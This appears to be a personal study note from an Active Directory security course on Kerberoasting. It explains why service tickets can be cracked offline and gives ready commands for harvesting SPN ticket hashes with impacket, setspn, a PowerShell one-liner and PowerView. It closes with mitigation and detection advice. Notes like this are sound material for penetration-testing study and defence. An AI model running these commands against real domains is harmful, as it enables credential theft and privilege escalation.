```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 2 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```
Kerberoasting is a lateral movement/privilege escalation technique used in AD environments. It attacks [[Active Directory#Service Principal Name (SPN)|Service Principle Name (SPN)]] accounts.
![[Active Directory#Service Principal Name (SPN)]]
Domain accounts are often used to run services to overcome network auth limitations of local built-in accounts. However, any domain user can request a Kerberos ticket for any service account in the same domain (*This is also possible across trusts if the relationship permits it*). Once you have an account (credentials, NTLM hash, shell in context, or SYSTEM access on a domain joined host), you can perform a Kerberoasting attack.

Domain accounts that run services are often local administrators or high privileged domain accounts due to the distributed nature of how the services interact in the network.

> Kerberoasting can also be done cross-forests when either an inbound or bidirectional trust is present.

**The Key Vulnerability**
Even with a Kerberos ticket for one of these privileged accounts, we cannot just execute commands as that user. However, the ticket ([[Kerberos#Ticket Granting Service (TGS)|TGS-REP]]) is *encrypted with the service account's NTLM hash*. This then means that theoretically, the plain-text password for the service account could be brute forced (eg. [[Hashcat]]).

Often, the password for these service accounts are weak or reused, so breaking one could give you access to a variety of accounts or servers. Cracking one of these service accounts, could give you an attack path through a service to gain RCE.

The attack can be performed from multiple places:
- From a non-domain joined Linux host using valid domain user credentials
- From a domain-joined Linux host as root after retrieving the `keytab` file
- From a domain-joined Windows host authenticated as a domain user
- From a domain-joined Windows host with a shell in the context of a domain account
- As `SYSTEM` on a domain-joined Windows host
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) `/netonly`

## Kerberoasting with GetUserSPNs.py - Linux
`GetUserSPNs.py` is an [impacket toolkit](https://github.com/SecureAuthCorp/impacket) script for working with SPNs.
### Request TGS tickets for SPN accounts
```bash
# Requests from all accounts
GetUserSPNs.py -dc-ip [ip] [domain]/[user] -request -outputfile all_accounts_tgs

# Requests from a single account
GetUserSPNs.py -dc-ip [ip] [domain]/[user] -request-user [target-user]
```
> The output will be in format for [[Hashcat]] - mode: 13100
> We can then use a tool like [[CrackMapExec]] to validate the account credentials once cracked.

## Manual Kerberoasting with setspn.exe - Windows
Before modern automated tools existed, manual methods such as using the built-in [setspn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) was the way this attack was performed.
The general methodology is to extract a bunch of SPNs, then request TGS tickets and have them loaded into memory. Finally, we can then use a tool like [[Mimikatz]] to extract them from memory.
### Enumerate SPNs
```batch
setspn.exe -Q */*

:: Example Output
CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
```
> This will return not only users, but computers too. You may want to only focus on users.

### Targeting a single user
```PowerShell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```
The general concept here is:
1. The `Add-Type` cmdlet allows us to use `.NET` classes
2. The `-AssemblyName` allows us to specify the assembly with the types we need
3. [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is the namespace that contains the classes relating to building security token services
4. `New-Object` creates a new `.NET` object
5. Using the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class creates a security token for the passed SPN name for our currently logged in user
> This is essentially what automated tools such as [[Rubeus]] do

### Targeting all users
> This will include computers, not just users

```PowerShell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

### Extracting the tickets from memory using [[Mimikatz]]
![[Mimikatz#Extracting Kerberos TGS Tickets]]

## Automated Kerberoasting with PowerView - Windows
### View users with SPNs
```PowerShell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```
> This command can also be given a `-Domain` flag for cross-domain kerberoasting
### Target a specific user
```PowerShell
Get-DomainUser -Identity [user] | Get-DomainSPNTicket -Format Hashcat
```
### Extracting all tickets to a csv
```PowerShell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv [outputfile].csv -NoTypeInformation
cat [outputfile].csv
```

## Automated Kerberoasting with [[Rubeus]] - Windows
![[Rubeus#Summary]]
![[Rubeus#Usage]]

## Mitigation & Detection
### Non-managed service accounts
Using long and complex passwords or pass phrases can drastically reduce the risk of passwords being cracked. A better recommendation is to use [Managed Service Accounts (MSA)](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009), and [Group Managed Service Accounts (gMSA)](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), which use very complex passwords, and automatically rotate on a set interval (like machine accounts) or accounts set up with [[Windows#Local Administrator Password Solution (LAPS)|LAPS]].

### Looking for an abnormal number of TGS requests
When Kerberoasting is being performed, an abnormal number of `TGS-REQ` and `TGS-REP` requests and responses will be made. This could be an indication of automated tools being used. Monitoring can be enabled by selecting [Audit Kerberos Service Ticket Operations](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-kerberos-service-ticket-operations) within Group Policy.

Doing so will generate two separate event IDs: [4769](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769): A Kerberos service ticket was requested, and [4770](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4770): A Kerberos service ticket was renewed. 10-20 Kerberos TGS requests for a given account can be considered normal in a given environment. A large amount of 4769 event IDs from one account within a short period may indicate an attack.

### Restrict usage of RC4 encryption
Restricting the use of weak encryption algorithms can also play a part in increasing the time it would take to crack them passwords, when combined with complex passwords, this can make it unfeasible to crack passwords 
